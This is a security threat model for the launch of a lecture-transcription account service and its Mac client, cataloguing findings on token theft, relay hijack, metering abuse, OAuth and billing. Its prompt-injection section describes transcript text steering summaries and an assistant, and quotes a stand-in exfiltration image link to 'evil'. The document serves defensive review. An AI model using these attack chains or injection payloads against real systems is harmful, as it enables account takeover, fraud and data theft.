# Threat model for the 0.6.0 launch

Written 2026-09-29 against `syllabus-accounts` `main` at `64253e3` and
LectureAI `main` at `de05f3c`. It answers HOME-STRETCH "The security bar",
item 2 (a written threat model), and feeds items 4 and 7 (the ASVS pass in
[asvs-l1-checklist.md](asvs-l1-checklist.md) and the rule that no high or
critical finding stays open).

[threat-model.md](threat-model.md) is the standing reference: assets, actors,
trust boundaries and a route table. This document is the launch review on top
of it. Every claim below was checked against the source, and the file and
line is named so it can be checked again.

Nothing here was tested against production. Where a claim depends on how
production is configured (a Worker secret, a Cloudflare setting, a dashboard
toggle), it says "unverified" and says what to look at.

## How to read it

Each section names the **asset**, the **attacker**, the **entry points**, the
**mitigations that exist** (verified in code), the **residual risk**, and a
**severity**.

- **Critical:** loses money or account data at scale, or takes over accounts,
  with no meaningful precondition.
- **High:** loses money or an account with a plausible precondition. Blocks
  launch unless fixed or accepted in writing by the owners.
- **Medium:** real harm with a real precondition, or a control missing that
  the rest of the design leans on. Triaged in writing below; not blocking.
- **Low:** hardening, or harm that needs the attacker to already hold most of
  what they would gain.

Line numbers are for the commits above and will drift; the function names
will not.

## Findings at a glance

| ID | Severity | Finding | Blocks launch |
|---|---|---|---|
| F-01 | **High** | The transcription meter trusts a length the caller writes, so 12 MiB of audio can be charged as one second | No: fixed by PR #51 |
| F-02 | **High** as deployed | `PANEL_ORIGIN` is empty in `wrangler.jsonc`, so a relayed panel runs on the account origin and a stolen device token becomes script on the account pages | **Yes**, until set or accepted |
| F-03 | Medium | Browser sessions cannot be revoked; "sign out every Mac" leaves every browser signed in for up to 30 days | No: fixed by PR #48 and PR #55 |
| F-04 | Medium | Device-code phishing: a link with the code prefilled and an attacker-chosen Mac name enrolls the attacker's Mac into a victim's account | No |
| F-05 | Medium | A browser session is remote control of the Mac's panel (start the mic, change setup), and a hijacked relay sees what the owner types | No |
| F-06 | Medium | Account deletion refunds unused time with no regard for use, so an allowance can be spent and the money taken back | No |
| F-07 | Medium | The deploy path is open to anyone with write access: unprotected `production` environment, no required reviews, secret scanning off | No |
| F-08 | Medium | The DRIVE_KEY runbook cannot execute its "key and database both leaked" branch as written | No: tool built in PR #54 |
| F-09 | Low | Prompt injection through transcript text can alter summaries, action items and study answers (integrity only) | No: fixed by PR #53 and LectureAI PR #101 |
| F-10 | Low | Trial farming with many Google accounts; the 100% off code is a bearer secret | No |
| F-11 | Low | The Drive consent flow is not bound to the account that started it | No: fixed 2026-10-02 |
| F-12 | Low | Rotating `SESSION_SECRET` silently disables the repeat-trial block | No |
| F-13 | Low | `DRIVE_KEY` is hashed, not stretched, and its strength is not checked | No |
| F-14 | Low | The assistant caches plaintext summaries and transcripts on the Mac, against what its own docstring says | No: fixed by LectureAI PR #102 |
| F-15 | Low | A relayed panel can send a `Location` header, and relayed pages carry no CSP | No |
| F-16 | Low | A stalled assistant stream can outlive its 900 second reservation | No: fixed 2026-10-02 |
| F-17 | Low | A device code lives 15 minutes; ASVS 2.7.2 says 10 | No: fixed 2026-10-02 |
| F-18 | Low | Per-address limits let one script lock a shared address out of sign-in | No |
| F-19 | Low | GitHub Actions are pinned by tag, not by commit | No: fixed 2026-10-02 |
| F-21 | **High** | The `quality=high` second pass (PR #57) has no provider-measured duration, so it is billed on the caller's header and the byte floor again: F-01 on a path the caller picks | No: closed by PR #62 (the pass is refused until it is bound to a measured length) |
| F-22 | Medium | LectureAI's release workflow (LectureAI PR #105) reads the signing and Sparkle keys as repository secrets on any `v*` tag, so anyone who can push a tag can ship a trusted update to every Mac | No: LectureAI PR #113 plus the `release` environment settings in its `docs/signing.md` |

### Status after the 0.6.0 security PRs landed

| ID | Status | Where it is shown |
|---|---|---|
| F-01 | Fixed by PR #51: the meter charges at least one second per 24000 bytes up front and settles up to the provider's own duration | `test/meter-floor.test.ts`, `test/threat-model-claims.test.ts` |
| F-03 | Fixed by PR #48 (`__Host-` cookie names) and PR #55 (`session_version`, migration 0017): "Sign out every Mac" now ends every browser session | `test/session-cookie.test.ts`, `test/session-version.test.ts` |
| F-08 | Fixed by PR #54: `scripts/bulk-revoke.mjs`, described in [bulk-revoke.md](bulk-revoke.md) and linked from [drive-key-rotation.md](drive-key-rotation.md). Rehearse the dry run against production before it is needed | `test/bulk-revoke.test.ts` |
| F-09 | Fixed by PR #53 here and LectureAI PR #101, which must stay in step (the prompt parity check) | `test/untrusted-transcript.test.ts` |
| F-14 | Fixed by LectureAI PR #102: the assistant keeps fetched lecture text in memory only and clears it on sign-out | LectureAI `test_assistant.py` |
| F-21 | Found 2026-10-02 in the review of every PR merged after this document. Closed by PR #62: `/proxy/transcribe` answers `quality_unavailable` for `quality=high` unless `HIGH_QUALITY_PASS` is `"on"`, which production does not set. Then fixed at the root: a standard pass that Groq measured records that length against a SHA-256 of the bytes (`measured_chunks`, migration 0018), and a high pass is billed at 3x that length, or refused with `first_pass_required` when no measured pass of the same bytes from this account in the last day exists. The switch can now go on with LectureAI #104 | `test/proxy.test.ts` "bills a second pass on what the provider measured, not on a header that lies", "refuses a second pass on audio no standard pass measured", "takes no measurement from another account, or from an OpenAI first pass" |
| F-22 | Found 2026-10-02 in the same review. LectureAI PR #113 moves the build job onto a `release` environment. Closed once that environment exists with required reviewers and a `main` / `v*` deployment rule, a `v*` tag ruleset limits tags to admins, and the six secrets are added there rather than to the repository | LectureAI `docs/signing.md` |

The sections below are the review as written on 2026-09-29 and are kept as
the record of what was found.
| F-20 | Low | JSON answers carry no `Cache-Control: no-store`, only HTML does | No: fixed 2026-10-02 |

Two launch blockers, and both have a small fix. Everything else is in the
triage at the end.

---

## T1. Device token theft

**Asset.** A device token is a bearer for one Mac's standing on one account.
Held by an attacker it can: spend the account's transcription, summary and
assistant allowance (`src/proxy.ts`, `src/assistant.ts`), read and overwrite
the account's schedule (`src/settings.ts:39`), mint one-hour Drive access
tokens for every file Syllabus created in the person's Drive
(`src/drive.ts:123`), and become the panel (T2).

**Attacker.** Anyone who copies `account.json` off a Mac: malware running as
the user, a Time Machine or cloud backup, a stolen or resold laptop, a
support bundle sent to the wrong place. LectureAI's SECURITY.md puts "your
unlocked Mac" and "your `~/.intake` directory" out of scope, which is
reasonable for that repo and is exactly why this side has to assume the token
can leak.

**Entry points.** Every bearer route: `/me`, `/settings/:name`,
`/drive/token`, `/drive/status`, `/proxy/*`, `/relay/connect`,
`/device/revoke`. All pass through the one middleware at `src/index.ts:52`.

**Mitigations that exist.**
- 256 bits from `crypto.getRandomValues`, prefixed `syd_`
  (`src/util.ts` `newDeviceToken`); only the SHA-256 is stored
  (`src/db.ts:143` `resolveDeviceToken` joins on the hash). Shown once, at
  the poll that collects it (`src/devices.ts:189`).
- The Mac stores it 0600 in a 0700 directory, written atomically
  (LectureAI `intake/config.py` `write_private`, called from
  `intake/account.py:113`). It is a plaintext file, not a Keychain item.
- **Idle expiry:** 90 days unused and the token is dead; use slides the
  window, written at most once a day (`src/devices.ts:38` `TOKEN_IDLE_DAYS`,
  `tokenStanding`; `test/expiry.test.ts`).
- **Revocation:** one Mac (`src/db.ts:87`), or every Mac at once with
  `token_version` bumped so that a replacement a thief enrolled dies with
  the token that enrolled it (`src/db.ts:123`; `test/devices.test.ts`
  "signing out every Mac"). The join in `resolveDeviceToken` checks both
  revocation flags and `t.token_version = a.token_version`.
- **A device token is not a person.** `browserOnly()` (`src/session.ts:137`)
  refuses it on device approval, device removal, Drive connect and
  disconnect, billing and account deletion (`test/devices.test.ts` "a device
  token is not a person").
- **Spend is bounded.** The allowance is reserved in the same statement that
  checks it (`src/db.ts:518` `reserveUsage`), per-account rate limits apply
  (`src/proxy.ts:140`), and a monthly ceiling covers every account together
  (`src/proxy.ts:160`, held in the same statement:
  `test/spend-limits.test.ts` "the ceiling across every account",
  PR #43). **This bound had a hole (F-01), closed by PR #51.**
- The Drive refresh token never reaches the token holder, only an access
  token that lasts an hour and is limited to `drive.file`.

**Residual risk.**
- Until it is revoked or idle for 90 days, a copied token can spend the whole
  allowance. Before PR #51 (F-01) it could spend far more than the allowance.
- A thief can read the person's schedule and mint Drive tokens for files
  Syllabus created (lecture summaries and transcripts). That is a
  confidentiality loss that revocation only stops going forward.
- The token holder can be the panel (T2 and F-02).
- Nothing tells the owner a token is in use somewhere new. `last_seen_at`
  exists on the device row but nothing compares addresses or alerts.

**Severity.** Medium on its own (bounded by allowance and revocable);
High with F-01 or F-02 in play.

**Proposed hardening (not blocking).** Store the token in the macOS Keychain
rather than a file; show "last seen" and the count of Macs prominently on the
account page (the row exists); consider an alert email on a new Mac.

---

## T2. Relay hijack

**Asset.** The owner's browser session on the account origin, the owner's
trust in `/p/<device>/`, and anything the owner types into a relayed panel
(assistant questions, the setup page's API keys and Notion token).

**Attacker.** Someone holding the device token (T1), or a compromised panel
on the Mac. Both can open the relay socket and answer as the panel.

**Entry points.**
- `GET /relay/connect` (`src/relay.ts:68`): a bearer plus a WebSocket upgrade
  reaches the device's Durable Object. The Worker overwrites `X-Relay-Op` and
  `X-Relay-Device` after copying the client's headers (`src/relay.ts:72-76`),
  so a client cannot invoke the `forget` or `state` operations or claim
  another device.
- `PanelRelay.acceptPanel` (`src/panel-relay.ts:204`): **one panel per device
  and the newest connection wins** (line 212). A token holder therefore
  displaces the real Mac, and the real Mac's reconnect displaces the thief
  again; whoever connected last answers.
- The DO answers a browser's request with whatever the socket returns:
  status, body, and the headers in `RESPONSE_HEADERS`
  (`src/panel-relay.ts:78`), which includes `content-type` and `location`.

**Mitigations that exist.**
- **The Worker decides who may reach a panel.** `/p/:device/*` needs a
  session, and `ownedDevice` (`src/relay.ts:96`) requires the device to be the
  signed-in account's and not revoked (`src/db.ts:277` filters
  `revoked_at IS NULL`, so a revoked Mac's still-open socket is unreachable).
  A device token is refused at `/p/` (`src/relay.ts:138`). Covered by
  `test/relay.test.ts` and `test/isolation.test.ts`.
- **What may be carried is an allowlist:** GET and POST to `/`, `/setup`,
  `/api/*`, `/static/*` (`src/relay.ts:42`, `relayAllowed`, which also
  rejects `..`). Request headers are an allowlist of five
  (`src/panel-relay.ts:76`); cookies never cross. Request body 64 KB,
  response 4 MB (`src/panel-relay.ts:58-60`).
- **POSTs must be same-origin** on either host (`src/relay.ts:162`;
  `src/panel-host.ts:345` `fromPanelHost`).
- **The Mac checks too.** LectureAI's `signin.gate` refuses a relayed request
  whose viewer account is not the Mac's own account (`intake/signin.py:139`
  `relay_viewer`, `:153` `gate`).
- **The panel host** (PR #41, `src/panel-host.ts`) serves panels from an
  origin of their own, so a hijacked panel's script cannot touch the account
  pages. Tickets are HMAC-signed, single use (D1 nonce), 60 seconds, bound to
  a device and an account (`src/panel-host.ts:134`, `:171`); the panel
  cookie is host-only, path-scoped to one device, 12 hours, and dies with
  "sign out every Mac" (`:225`). `panelOrigin` refuses a host that is the
  account host, a parent, or a subdomain (`:73`). Covered by
  `test/panel-host.test.ts`.

**Residual risk.**
1. **F-02 (High as deployed).** `wrangler.jsonc` sets `"PANEL_ORIGIN": ""`
   (line 62), and `wrangler deploy` writes vars from that file, so unless the
   Cloudflare dashboard says otherwise (unverified) panels are served from
   `https://syllabusaccounts.maincoursemedia.com/p/<device>/`. Then the chain
   is: steal a token, connect to `/relay/connect`, wait for the owner to open
   their panel from the link on the account page, and answer with HTML and
   script. That script is same-origin with the account pages and runs with the
   owner's cookie. It can post `/device/approve` (enrolling the attacker's
   Mac; `browserOnly` and `sameOrigin` both pass, because the request is a
   real cookie request from the right origin), `/devices/revoke-all` (locking
   the owner out of their own Macs), `/drive/disconnect`, and `/billing/portal`.
   It can read `/` and see the email. It cannot delete the account, because
   `/account/delete` needs a Google sign-in from the last 10 minutes
   (`src/account.ts:80`), which no script can produce. `src/account.ts:71-79`
   and the CSRF audit on `liam/csrf-audit` both already say this ("Sound only
   with `PANEL_ORIGIN` set"). Relayed pages carry no CSP by design
   (`src/headers.ts:55`).
2. **Even with the panel host, the hijacker owns the panel's pixels.** They can
   show the owner a fake page at a URL the owner trusts, and they see every
   request the owner sends: assistant questions and, on the Setup page, API
   keys and the Notion token (F-05). The panel host limits this to the panel's
   own origin; it does not stop it.
3. **`Location` passes through** (`RESPONSE_HEADERS`), so a hijacked panel can
   redirect the owner anywhere from a trusted address (F-15). Low.
4. The real Mac and the thief flap: each reconnect closes the other's socket
   (`src/panel-relay.ts:212`). This is noisy rather than stealthy, but nothing
   alerts on it.

**Severity.** High while `PANEL_ORIGIN` is empty and tokens can be stolen
(F-02); Medium once it is set (F-05, F-15).

**Fix for F-02 (small, and it is configuration).** Give the Worker a second
host on a different registrable domain from `maincoursemedia.com` (the
comment at `wrangler.jsonc:44-56` explains why a sibling subdomain is weaker),
put it in `PANEL_ORIGIN`, check `curl <host>/healthz`, deploy. LectureAI needs
no change: the panel shows the address the welcome frame gives it
(`src/panel-relay.ts:224`, `panel_url`). If the owners would rather ship 0.6.0
first, the alternative is a written acceptance of F-02 with the compensating
facts above (it needs a stolen token and a click by the owner, and account
deletion stays locked). That is a decision for Liam.

---

## T3. The proxy as a key-exfiltration target

**Asset.** `GROQ_API_KEY`, `OPENAI_API_KEY`, `ANTHROPIC_API_KEY` (real money,
shared by every account), and the Stripe keys.

**Attacker.** A signed-up user (free, one Google account) with a device
token, who wants either the keys or the compute; an insider or a stolen CI
token; a prompt injected into a transcript.

**Entry points.** `POST /proxy/transcribe` (`src/proxy.ts:355`),
`POST /proxy/summarize` (`:452`), `POST /proxy/assistant`
(`src/assistant.ts:672`).

**Mitigations that exist (verified).**
- **The caller cannot choose where the request goes or what it says.** Upstream
  URLs, models, system prompts, tool, schema, `max_tokens` and `thinking` are
  constants in `src/proxy.ts:82-91` and `src/assistant.ts:69-108`. The
  transcription form is rebuilt with three fields (`src/proxy.ts:331-334`); the
  only caller strings that travel are the audio bytes, its filename and MIME
  type, a capped `subject` and `date` (`label()`, 120 characters), and the
  transcript. No URL or header from the caller is ever fetched (SSRF: no).
- **No key can come back in a response.** Responses are `{text}`,
  `{summary,tokens}` or a re-emitted vocabulary of events
  (`src/assistant.ts:539` `relayStream` never forwards a provider event).
  Provider error bodies are dropped and only the status is logged
  (`src/proxy.ts:179` `providerFailed`).
- **Logs are scrubbed** of `sk-`, `sk-ant-`, `gsk_`, `Bearer ...`,
  `whsec_` and Google token shapes, emails and query strings
  (`src/log.ts:19-23`); `test/logs.test.ts` and `test/no-pii-in-logs.ts`
  hold the call sites to it.
- **The model never holds a key.** So an instruction hidden in a transcript
  has nothing to leak; it can only change the text the caller receives.
- Sizes are counted as bytes arrive (`src/proxy.ts:257` `boundedBody`), so a
  chunked or lying request cannot buffer past its cap.
- Summary and assistant cost is settled to the **provider-reported** token
  usage (`src/proxy.ts:549-553`, `src/assistant.ts` `costOf`), which the caller
  cannot influence.
- Restricted Stripe key for account deletion (`src/stripe.ts:148`, PR #44) so
  a leak of the Checkout key cannot cancel, refund or delete.
- Secrets exist only as Worker secrets; `.dev.vars` is gitignored
  (`.gitignore`); the repo is public and the Google client id, which is
  public by design, is the only credential in it.

**Residual risk.**
- **F-01 (High). The transcription meter takes the length from the file the
  caller wrote.** `src/proxy.ts:398-401` charges
  `max(mp4DurationSeconds(bytes), declared)`; `mp4DurationSeconds`
  (`src/mp4.ts:61`) reads `moov/mvhd`, which is a field in the caller's own
  upload. The comment above it says "the only number that cannot be argued
  with is the one in the file"; the file is the caller's. Audio does not have
  to be short to say it is: a 12 MiB (the cap, `src/proxy.ts:112`) low-bitrate
  m4a holds hours, and `mvhd` can say one second. The existing tests all use
  a truthful header (`test/proxy.test.ts:165-215`), so none catches it.
  **Proved:** `test/threat-model-claims.test.ts` uploads 12 MiB with a header
  of one second and it is charged one second (the test held the desired
  behavior as `it.fails` until PR #51 landed; the marker is now removed and
  the test passes).
  What it costs: the provider bills the true duration. Groq is about $0.111 an
  hour, OpenAI $0.18. At the per-account limit of 20 requests a minute
  (`src/proxy.ts:140`) a single account with hour-long audio in each request
  can generate well over a hundred dollars of provider spend an hour, and the
  monthly ceiling (`src/proxy.ts:160`) and the allowance never notice, because
  both count the charged seconds. Any Google account gets a token by running
  the device flow from a script, so this needs no purchase and no Mac. I did
  not run it against a provider; how many hours a single request can carry
  depends on provider file and duration limits (unverified), which bound the
  per-request figure but not the fact that the meter is wrong.
  **Fix, in order of strength:**
  1. Settle to the provider's own duration. Groq's `verbose_json` response
     carries `duration`; the OpenAI leg reports usage in its JSON response
     (check the field for `gpt-4o-mini-transcribe`). Charge the larger of that
     and the estimate, and let the account go over once: the next request finds
     the allowance spent.
  2. Immediately, as a floor that cannot hurt an honest file: also charge
     `ceil(bytes / 24000)`. 24,000 bytes a second is 192 kbps, the highest
     bitrate this cap is sized for, so every honest chunk is at least this
     long. It turns "one second" into "about 524 seconds for 12 MiB" and
     bounds the lie at roughly 32x (a 6 kbps stream), which is worth about $18
     of provider spend per free trial instead of unbounded.
  3. Optionally read the sample tables (`stsz`, `stts`) rather than `mvhd`,
     which is what a decoder plays.
- The proxy is one key for every account, so a provider-side rate limit is
  a ceiling on the whole product (`src/proxy.ts:67-72` says so). Nothing here
  changes that.
- **Anyone who can deploy code can read every secret.** The deploy workflow
  holds `CLOUDFLARE_API_TOKEN` with Workers Scripts:Edit (`.github/workflows/deploy.yml`),
  and a Worker can return its own bindings. The GitHub side is F-07.
- A stalled assistant stream can outlive its reservation and settle to nothing
  (F-16, Low; the session table still caps the dollars).

**Severity.** High (F-01). Otherwise Low.

---

## T4. D1 row access across accounts

**Asset.** Every row keyed by an account: settings, Drive grants, usage,
allowances, subscriptions, assistant sessions, devices, tokens.

**Attacker.** A signed-in user, or a device-token holder, trying to read,
spend against, or change another account's rows.

**Entry points.** Every route that takes an id from the caller: `:id` in
`/devices/:id/revoke`, `:device` in `/p/:device/*`, `:name` in
`/settings/:name`, `session_id` in `/proxy/assistant`, the Stripe customer and
subscription ids in webhook payloads, `code` in the device flow.

**Mitigations that exist (verified).**
- **Every query is parameterized** with `.bind()`. The two template-string
  queries interpolate constants only: `${devicesOfAccount}` in
  `src/db.ts:889` and `${column}` in `src/assistant.ts` `undoTake`, chosen from
  two literals. There is no `eval`, `new Function` or `innerHTML` in `src/`.
- **Account scoping is in the WHERE clause, not in the handler.** Device revoke
  filters `AND account_id = ?` (`src/db.ts:87`), settings are read and written
  by `(account_id, profile, name)` (`src/db.ts:292`, `:305`), Drive grants by
  `account_id` (`:341`), assistant sessions by `id AND account_id`
  (`src/assistant.ts:230`, `:281`). The account comes from the resolved
  credential, never the request.
- **Two credentials on one request** resolve to the token's account and never
  blend; a dead token does not fall back to a cookie (`src/index.ts:57-60`;
  `test/isolation.test.ts` "two credentials on one request").
- **Identity is the Google `sub`**, not the email (`src/db.ts:15`
  `upsertAccount`), so no email-change or pre-registration account takeover.
- **Stripe events map to accounts** through the `account_id` this Worker
  stamped at Checkout (`client_reference_id`, subscription metadata) and the
  customer link, not through anything a payer can edit (`src/stripe.ts:272`
  `accountFor`); a stamp naming a deleted account is ended rather than
  applied.
- **Evidence:** `test/isolation.test.ts` (PR #42) covers settings, Drive
  grants, usage, study sessions (carry-on and escalation by a second
  account), two credentials, and revocation leaving other accounts alone;
  `test/spend-limits.test.ts` (PR #43) covers concurrent reservation.

**Residual risk.**
- Isolation is by convention: each new query has to remember its account
  filter. There is no row-level policy in D1 to fall back on. The tests are
  the safety net, and a new table should come with an isolation test.
- Rate-limit and Stripe-event tables are keyed globally on purpose
  (`bucket`, event id); neither returns data to a caller.
- `deleteAccountData` is a batch keyed by account and sub-hash
  (`src/db.ts:889`); tested by `test/account.test.ts`.

**Severity.** Low. No cross-account read or write was found.

---

## T5. The OAuth callback surface

**Asset.** The sign-in itself (an account is created or entered here) and the
Drive consent that stores a refresh token.

**Attacker.** A malicious site linking the victim into a flow; someone who can
plant or replay a cookie; someone who steals an authorization code; someone
tampering with the redirect target.

**Entry points.** `GET /login` (`src/google.ts:117`), `GET /oauth2/callback`
(`:149`), `GET /drive/connect` (`src/drive.ts:36`), `GET /logout` and
`POST /logout` (`src/google.ts:230`, `:239`).

**Mitigations that exist (verified).**
- **State, nonce and PKCE (S256)** ride in a signed, HttpOnly, SameSite=Lax,
  Secure, ten-minute cookie (`src/google.ts:128-134`). A flow without a
  verifier is refused (`:161`). The callback is limited per address before it
  calls Google (`:150`; `test/security.test.ts` "PKCE on both Google flows").
- **The ID token's issuer, audience, expiry, nonce, subject and verified email
  are checked** (`src/google.ts:104` `checkClaims`). The signature is not, and
  need not be: it comes straight from Google's token endpoint over TLS
  (OpenID Connect Core 3.1.3.7), and the comment at `:8-16` says so.
- **`next` is resolved as a browser would** and kept only if it stays on the
  origin; backslashes and control characters are refused (`:57`
  `safeNext`, tests in `test/security.test.ts`). The value used after sign-in
  comes from the signed cookie, not the query.
- **Sign-in is `prompt=select_account`** (`:144`), so a recent `t` in the
  session cookie means a person clicked through Google's chooser. Account
  deletion leans on this (`src/account.ts:71-85`).
- **Logout** acts on a GET only for `Sec-Fetch-Site: same-origin` or `none`,
  otherwise it shows a button (`:230`); a POST needs `sameOrigin`.
- **Cookies:** the session is HttpOnly, Secure, SameSite=Lax, host-only,
  signed with SESSION_SECRET; a second cookie of the same name is refused
  (`src/session.ts:54`, `countCookie`).
- The `liam/csrf-audit` branch additionally refuses a planted flow cookie (a
  sibling host setting one with a `Domain` attribute) and adds a central
  `crossSiteGuard`. Not on `main` yet; recorded here because it closes a real
  login-CSRF path that exists today only when a sibling host can set cookies.

**Residual risk.**
- **F-11 (Low). The Drive consent is not tied to the account that started
  it.** The flow cookie carries `kind: "drive"` but not the account id
  (`src/drive.ts:42`), and `finishConnect` uses whichever account is signed in
  when the callback lands (`:70-97`). It also does not require that the Google
  identity that consented is the account's own: `claims.sub` and the email are
  never compared to the account, only stored as `google_email`. A person can
  therefore attach a different Google account's Drive on purpose (this may be
  wanted), and a browser whose session changed inside the ten-minute window
  attaches the grant to the wrong account. Fix: put the account id in the flow
  and refuse if it differs; decide whether a different Google identity is
  allowed.
- **F-03 (Medium). Cookie hardening.** Cookie names lacked the `__Host-` prefix (fixed by PR #48).
  Without it a sibling host can plant a lone session cookie (CSRF-audit
  finding 2). Renaming signs everyone out once. See F-03 in the triage.
- The state comparison is not constant time (`:161`). Not exploitable (the
  value is single use and a fresh random per flow); noted for completeness.
- The Google client secret is a Worker secret, read at `src/google.ts:185`;
  it appears only in the body to Google's token endpoint over TLS.

**Severity.** Low, with F-03 Medium and F-11 Low.

---

## T6. Prompt injection through transcript text

Reviewed for the first time here. Files read: LectureAI
`intake/summarize.py`, `intake/assistant.py`, `intake/insights.py`,
`intake/tasktext.py` (partly), `intake/templates/index.html` (the answer
rendering), and on this side `src/prompts.ts`, `src/proxy.ts` (summarize) and
`src/assistant.ts`.

**Asset.** The correctness of a student's notes and to-dos, the privacy of
their other lectures, and the operator's model spend.

**Attacker.** Whoever speaks or writes text that ends up in a transcript: an
instructor, a classmate whose voice the mic picks up, a guest, or, for the
Sous profile, a client on a call. Also whoever edits a filed summary in Drive.

**Data flow.**
1. Audio becomes a transcript (`/proxy/transcribe`).
2. The transcript goes into the **user turn** of a summarize call, framed as
   `Course: ... / Date: ... / Lecture transcript: ...` (`src/prompts.ts:163`,
   `intake/summarize.py:57`). The output is forced into a fixed tool schema
   (`src/proxy.ts:530-531`, `tool_choice: {type: "tool"}`).
3. The summary, key terms and action items are filed to Drive as markdown
   (`intake/summarize.py:387` `render_markdown`) and action items go to Notion
   (`intake/notion_tasks.py`).
4. Later, the assistant reads **summaries** (model-written, from Drive) as
   `document` blocks with citations, and on escalation the raw **transcripts**
   the same way (`src/assistant.ts:478-508` `upstreamBody`).

**What an injected instruction can do.**
- Steer the summary and the key terms: add or drop items, change a deadline,
  insert text into `summary_md`.
- Add a fake action item to the student's Notion (task text is cleaned by
  `tasktext.clean` and capped at 140 characters, `intake/tasktext.py`).
- **Second order:** the corrupted summary is stored, then read by the
  assistant on every later question about that course, where it competes with
  the student's real question.
- Ask the assistant to call `fetch_transcripts` for lectures it did not need
  (cost: bounded, below), or bias what it says.

**What it cannot do (verified).**
- **Reach a key or another account.** The model holds no credential and has
  one tool.
- **Exfiltrate through rendering.** The panel escapes model output first and
  then renders only `##` headings and `**bold**`
  (`intake/templates/index.html:1457` `renderAnswer`); the user's bubble and
  the escalation reason use `textContent` (`:1445`, `:1503`). There are no
  links, images or HTML, so an injected `![](https://evil/?q=...)` stays text.
- **Read another course.** Lectures are filtered to the asked course before
  anything is built (`intake/assistant.py` `ask`), and `transcript_docs`
  matches the model's requested titles only against that list (`:336`).
- **Loop or fan out.** One escalation per question on both sides:
  `tool_choice: none` on the second call (`src/assistant.ts:504`),
  `escalations < questions` in SQL (`:248`), `MAX_TOOL_ROUNDS = 1`
  (`intake/assistant.py:63`), at most six transcripts of 120,000 characters
  (`:54-55`, `src/assistant.ts:114`, `:186`).
- **Change the shape of a summary.** Slugs are reduced to `[A-Za-z0-9]` and
  four words (`intake/summarize.py:79` `slugify_topic`), dates are re-parsed
  (`_clean_date`), kinds are checked against the profile's list, and the log
  writer collapses tabs and newlines (`intake/config.py:1280`
  `append_log_line`).
- **Cost more than the caps.** Tokens are settled to the provider's usage;
  sessions are capped at 12 questions, 60 minutes and $2
  (`src/assistant.ts:160-172`).
- Untrusted text is at least sent as **documents with citations**, which is
  the provider's recommended separation, and the question is a separate block
  after them (`src/assistant.ts:478-481`).

**Residual risk.**
- **F-09 (Low; integrity only). Fixed by PR #53 and LectureAI PR #101.** Neither summarize prompt nor the assistant
  prompt says that the transcript is untrusted data whose instructions are to
  be ignored (`src/prompts.ts:30-57`, `src/assistant.ts:120-126`, and their
  LectureAI copies; the parity check in `.github/workflows/prompt_parity.py`
  requires both sides to change together). Add one sentence to each and a
  structural delimiter around the transcript. It will not make injection
  impossible; it removes the easiest cases. No test currently feeds an
  injection string through the pipeline; one that asserts the output shape
  survives would be cheap.
- **Sous is the worse profile.** A call has a second party who is not the
  user; a client can, knowingly or by pasting text into a screen share, put
  instructions in the notes and to-dos the team then acts on. The impact is
  still integrity (a wrong task), not disclosure.
- Markdown in `summary_md`, key terms and `detail` is written to the Drive
  file unescaped (`intake/summarize.py:387-419`). Drive renders it as text or
  a Doc; it becomes a risk only if a future surface renders it as HTML.
- **F-14 (Low). Local cache. Fixed by LectureAI PR #102.** `intake/assistant.py:189-210` writes every
  summary and every fetched transcript to `~/.intake/.assistant/` as
  plaintext and never expires it. The module docstring says "everything the
  assistant can draw on lives in Drive and nowhere on this Mac", and the
  pipeline deletes the recording once it is filed. The directory is 0700 in
  practice (`config.ensure_home`) but the files are 0644, and verbatim
  transcripts persist. Either give the cache a TTL and 0600 files, or change
  the privacy copy. Relevant to PR #45 (privacy page).
- `intake/insights.py` is a log parser; it skips lines it cannot read, bounds
  numbers (`parse_measures`), and cannot be reached with model text because
  `append_log_line` collapses whitespace in every field. No finding.

**Severity.** Low.

---

## T7. Same-origin risks on relayed panels

This is T2's F-02 seen from the account pages' side, plus what the panel
itself exposes.

**Asset.** The cookie-authenticated routes: `/device/approve`,
`/devices/:id/revoke`, `/devices/revoke-all`, `/drive/connect`,
`/drive/disconnect`, `/billing/*`, `/account/delete`.

**Attacker.** Script inside a relayed page (a hijacked or malicious panel).

**What holds today, with or without a panel host.**
- CSP `default-src 'none'` and `frame-ancestors 'none'` on every page the
  Worker writes (`src/headers.ts:29-35`), `X-Frame-Options: DENY` on all
  responses, so a relayed page cannot frame the account pages and the account
  pages contain no script for anything to hijack.
- Account deletion needs a fresh Google sign-in and the typed email
  (`src/account.ts:80-125`).
- The relayed response cannot set a cookie: `Set-Cookie` is not in
  `RESPONSE_HEADERS` (`src/panel-relay.ts:78`).

**What does not hold without `PANEL_ORIGIN`.** Everything cookie-authenticated
above except deletion. See F-02 in T2.

**What the panel exposes to a session.** `/api/*` includes
`/api/record/start`, `/api/setup` (POST), `/api/drive/disconnect`,
`/api/account/signout` and `/api/calendar` (LectureAI `intake/gui.py:531`,
`:797`, `:927`, `:1081`, `:975`). Through the relay the Mac skips its own
cross-site check (`intake/signin.py:112-116`: "the account service's own gate
already decided"), so the Worker's `sameOrigin` on POST is the only CSRF
control for those calls. That control holds (`test/relay.test.ts` "relays a
POST body from the owner, and refuses one from another site"), but it means
**a stolen browser session is remote control of the Mac**: start the
microphone, change the schedule, replace the Notion token, sign the Mac out.
That is by design (the panel is a remote UI) and is F-05 (Medium).

**Severity.** High while `PANEL_ORIGIN` is empty (F-02); Medium after (F-05).

---

## T8. Stripe and billing abuse

**Asset.** Revenue, and provider spend that a subscription entitles.

**Attacker.** A payer trying to get service without paying, or paying and
taking it back; a forger of Stripe events; anyone with free accounts.

**Entry points.** `POST /stripe/webhook` (`src/stripe.ts:71`),
`POST /billing/checkout|portal|topup` (`src/billing.ts:74`, `:150`, `:179`),
`POST /account/delete` (refund path), the trial.

**Mitigations that exist (verified).**
- **Only Stripe writes an allowance.** The webhook verifies Stripe's signature
  over the raw body with the SDK's async verifier (`src/stripe.ts:161`), which
  also enforces its timestamp tolerance; with no `STRIPE_WEBHOOK_SECRET` every
  delivery is refused (`:72`). It is rate limited per address before the body
  is read (`:81`, `LIMITS.stripeWebhook`) and capped in size. The route is
  registered before the auth middleware on purpose (`src/index.ts:50`).
- **Replays grant nothing.** `claimStripeEvent` is an `INSERT OR IGNORE`
  (`src/db.ts:729`); a handler that fails releases the claim so Stripe's retry
  works (`src/stripe.ts:107-118`). Top-ups are keyed by Checkout session id.
- **The caller does not choose a price.** Checkout takes a tier name, maps it
  to a Price id from Worker vars (`src/billing.ts:44-50`), and an unrecognized
  Price grants Starter, never more (`wrangler.jsonc` comment; `src/tiers.ts`).
- **Billing routes are cookie-only** (`browserOnly`), same-origin checked and
  limited per account (`src/billing.ts` `ready`).
